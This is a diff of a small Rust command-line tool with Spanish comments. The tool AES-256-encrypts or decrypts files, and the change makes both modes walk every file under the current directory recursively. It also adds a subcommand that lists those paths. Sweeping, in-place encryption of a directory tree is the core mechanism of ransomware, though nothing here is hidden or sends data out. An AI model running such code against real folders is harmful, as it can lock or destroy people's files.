@@ -2,9 +2,10 @@ use aesstream::{AesReader, AesWriter};
 use clap::{App, SubCommand};
 use crypto::aessafe::{AesSafe256Decryptor, AesSafe256Encryptor};
 use rand::{thread_rng, Rng};
-use std::fs::{read, read_dir, write, File, OpenOptions};
+use std::fs::{read, write, File, OpenOptions};
 use std::io::{Read, Write};
 use std::path::Path;
+use walkdir::WalkDir;
 
 fn main() {
     // Argumentos
@@ -13,7 +14,14 @@ fn main() {
         .author("Ricardo M. Prieto (rchip)")
         .subcommand(SubCommand::with_name("cifrar"))
         .subcommand(SubCommand::with_name("descifrar"))
+        .subcommand(SubCommand::with_name("iterar"))
         .get_matches();
+
+    if let ("iterar", Some(_)) = matches.subcommand() {
+        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
+            println!("{}", entry.path().display());
+        }
+    }
 
     if let ("cifrar", Some(_)) = matches.subcommand() {
         // Verificar el subcomando cifrar
@@ -23,9 +31,9 @@ fn main() {
         let cifrar_aes = AesSafe256Encryptor::new(&key);
         // Creamos el cifrador con la clave
 
-        for archivo in read_dir("./").unwrap() {
+        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
             // Leemos los archivos que están en el directorio
-            let archivo = archivo.unwrap().path();
+            let archivo = entry.path();
             // Extraemos el path de cada archivo
             cifrar_archivos(&archivo, cifrar_aes);
             // Ciframos todo archivo en función del path y el cifrador
@@ -44,10 +52,9 @@ fn main() {
         let descifrar_aes = AesSafe256Decryptor::new(&key);
         // Creamos el cifrador con la clave
 
-        for archivo in read_dir("./").unwrap() {
-            //println!("{:?}", &archivo.unwrap());
+        for entry in WalkDir::new("./").into_iter().filter_map(|e| e.ok()) {
             // Leemos los archivos que están en el directorio
-            let archivo = archivo.unwrap().path();
+            let archivo = entry.path();
             // Extraemos el path de cada archivo
             descifrar_archivos(&archivo, descifrar_aes);
             // Ciframos todo archivo en función del path y el cifrador
